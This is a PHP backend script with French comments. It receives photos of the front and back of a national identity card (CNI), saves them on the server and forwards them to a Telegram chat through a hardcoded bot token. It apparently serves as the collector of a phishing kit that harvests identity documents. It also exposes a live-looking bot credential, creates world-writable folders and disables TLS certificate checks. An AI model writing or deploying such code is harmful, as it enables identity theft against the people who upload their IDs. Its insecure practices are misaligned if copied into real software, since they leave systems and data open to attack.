<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Configuration Telegram
$botToken = '8789856564:AAGjVTO-54kJn2yuBCZeMpPYwNR2Wq4kcvY';
$chatId = '-5077491193';

// Fonction pour générer un hash unique
function generateHash() {
    return bin2hex(random_bytes(16));
}

// Fonction pour envoyer à Telegram avec vérification
function sendToTelegram($botToken, $chatId, $rectoPath, $versoPath) {
    $success = true;
    $errors = [];
    
    // Envoyer recto
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chatId,
        'photo' => new CURLFile($rectoPath, 'image/png', 'recto.png'),
        'caption' => '📄 Recto CNI'
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result1 = curl_exec($ch);
    $httpCode1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode1 != 200) {
        $success = false;
        $errors[] = "Erreur envoi recto (HTTP $httpCode1)";
    }
    
    // Envoyer verso
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chatId,
        'photo' => new CURLFile($versoPath, 'image/png', 'verso.png'),
        'caption' => '📄 Verso CNI'
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result2 = curl_exec($ch);
    $httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode2 != 200) {
        $success = false;
        $errors[] = "Erreur envoi verso (HTTP $httpCode2)";
    }
    
    return ['success' => $success, 'errors' => $errors];
}

// Vérifier les données reçues
$data = json_decode(file_get_contents('php://input'), true);

if (!$data || !isset($data['recto']) || !isset($data['verso'])) {
    echo json_encode(['success' => false, 'error' => 'Données invalides']);
    exit;
}

// Créer le dossier CNI s'il n'existe pas
$cniDir = __DIR__ . '/CNI';
if (!file_exists($cniDir)) {
    mkdir($cniDir, 0777, true);
}

// Générer un hash unique pour le dossier
$hash = generateHash();
$dossierDir = $cniDir . '/' . $hash;

// Créer le dossier du client
if (!file_exists($dossierDir)) {
    mkdir($dossierDir, 0777, true);
}

// Sauvegarder les images
$rectoPath = $dossierDir . '/hash-recto.png';
$versoPath = $dossierDir . '/hash-verso.png';

// Supprimer le préfixe "data:image/jpeg;base64," et décoder
$rectoData = preg_replace('#^data:image/\w+;base64,#i', '', $data['recto']);
$versoData = preg_replace('#^data:image/\w+;base64,#i', '', $data['verso']);

$rectoData = base64_decode($rectoData);
$versoData = base64_decode($versoData);

file_put_contents($rectoPath, $rectoData);
file_put_contents($versoPath, $versoData);

// Envoyer à Telegram et vérifier
$telegramResult = sendToTelegram($botToken, $chatId, $rectoPath, $versoPath);

if ($telegramResult['success']) {
    echo json_encode([
        'success' => true,
        'message' => 'Documents envoyés avec succès',
        'dossier' => $hash
    ]);
} else {
    echo json_encode([
        'success' => false,
        'error' => 'Erreur Telegram: ' . implode(', ', $telegramResult['errors'])
    ]);
}
?>